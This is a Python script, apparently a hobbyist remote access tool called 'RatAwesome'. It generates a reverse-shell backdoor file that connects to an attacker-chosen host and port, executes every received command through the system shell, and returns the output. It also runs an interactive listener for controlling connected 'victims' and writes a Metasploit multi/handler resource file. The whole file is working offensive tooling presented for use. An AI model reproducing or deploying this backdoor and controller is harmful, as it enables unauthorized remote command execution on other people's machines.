#! /bin/python
# _*_ ecoding: utf-8 _*_
import argparse
import os
#import sys
import socket

W = '\033[37m'
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[0;33m'  # orange
B = '\033[1;34m'  # blue
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan

localhost = str('10.42.0.1')
#file = sys.argv[0]
sh = os.system

parse = argparse.ArgumentParser()
parse.add_argument("-i", "--ip", help="Set IP Localhost")
parse.add_argument("-p", "--port", help="Set Port of IP Objetive")
parse.add_argument("-c", "--create", help="Create file evil with lines scripts backdoor python (set namefile)")
parse.add_argument("-l", "--listener", "--listen", help="Start Server waiting victims (set port listener)")
parse.add_argument("-msf", "--metasploitcreate", help="Create file RC auto of Metasploit (set namefile & port)")
parse = parse.parse_args()
def main():
    if parse.ip:
        print(G+"[+]"+O+" IP >> "+parse.ip)
    if parse.port:
        print(G+"[+]"+O+" Port >> "+parse.port)
    if parse.create:
        name = parse.create
        filename = name+'.py'
        f = open(filename, 'w')
        f.write("import socket, subprocess\n")
        f.write("rhost = '"+str(parse.ip)+"'\n")
        f.write("rport = "+str(parse.port)+"\n")
        f.write("client = socket.socket()\n")
        f.write("client.connect((rhost, rport))\n")
        f.write("while True:\n")
        f.write("    cm = client.recv(1024)\n")
        f.write("    cm = cm.decode()\n")
        f.write("    op = subprocess.Popen(cm, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)\n")
        f.write("    output = op.stdout.read()\n")
        f.write("    output_error = op.stderr.read()\n")
        f.write("    client.send(output + output_error)")
        f.close()
        print(G+"[+] "+W+"File evil "+str(parse.create)+".py created succesful")
    else:
        print(R+"[!] Without Create...")
    if parse.listener:
        port = parse.listener
        print(G+"[+] "+W+"Server initializing in the port "+str(port)+"...")
        server = socket.socket()
        server.bind((str(localhost), int(port)))
        server.listen(1)
        c, ca = server.accept() # Client and Client Addr 
        print(G)
        print(f'[+] {ca} Client connected ')
        while True:
            cm = input(G+"RatAwesome"+R+"("+str(ca)+")"+G+" >> "+W)
            if cm == "exit":
                exit()
            cm = cm.encode()
            c.send(cm)
            output = c.recv(1024)
            output = output.decode()
            print(f"received:\n {output}")
    if parse.metasploitcreate and parse.port:
        print(B+"[*] "+W+"Creating file for Metasploit...")
        msfile = parse.metasploitcreate+".rc"
        msf = open(str(msfile), 'w')
        msf.write("use exploit/multi/handler\n")
        msf.write("set LHOST "+localhost+"\n")
        msf.write("set LPORT "+parse.port+"\n")
        msf.write("set ExitOnSession false\n")
        msf.write("set EnableStageEncoding true\n")
        msf.write("#set AutoRunScript 'post/windows/manage/migrate'\n")
        msf.write("run -j")
        msf.close()
        print(B+"[*] "+W+"Execute for metasploit:  msfconsole -q -r "+msfile)
    else:
        print(R+"[-] Set port or namefile.")
def clear():
    sh("clear")
def banner():
    print(W+"""
               _     __,..---""-._                 ';-,
        ,    _/_),-"`             '-.                `\\   
       \|.-"`    -_)                 '.                ||   
       /`   a   ,                      \              .'/  
       '.___,__/                 .-'    \_        _.-'.'
          |\  \      \         /`        _`""""""`_.-'
             _/;--._, >        |   --.__/ `""""""`
           (((-'  __//`'-......-;\      )  """+G+"""###################"""+W+"""
                (((-'       __//  '--. /   """+G+"""R A T A W E S O M E"""+W+"""
                          (((-'    __//    """+G+"""###################"""+W+"""
                                 (((-'  """+P+"By "+C+"Mrx04programmer")


    

if __name__ == '__main__':
    try:
        clear()
        banner()
        main()
    except KeyboardInterrupt:
        print(R+"[!] Exiting...")
    except BrokenPipeError:
        print(R+"[!] Connection lose.")
    except Exception as e:
        #print(R+"Error of "+e) # testing
        print(R+"Error of "+str(e))
